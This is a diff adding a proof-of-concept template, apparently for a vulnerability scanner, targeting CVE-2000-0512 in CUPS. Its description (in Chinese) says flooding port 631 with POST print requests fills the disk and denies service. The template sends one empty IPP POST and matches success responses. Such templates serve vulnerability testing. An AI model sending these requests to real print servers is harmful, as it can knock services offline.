@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "向 CUPS IPP 服务端口 631 发送大量 POST 打印请求，触发请求文件未正确删除的缺陷，消耗磁盘空间导致拒绝服务"
+id = "POC-AVE-2000-0578"
+name = "CVE-2000-0512 CUPS DoS PoC"
+severity = "medium"
+tags = ["ave-2000-0578"]
+vuln_id = [
+    "CVE-2000-0512",
+    "AVE-2000-0578",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}:631/printers/"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/ipp"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "200",
+    "201",
+    "successful-ok",
+]
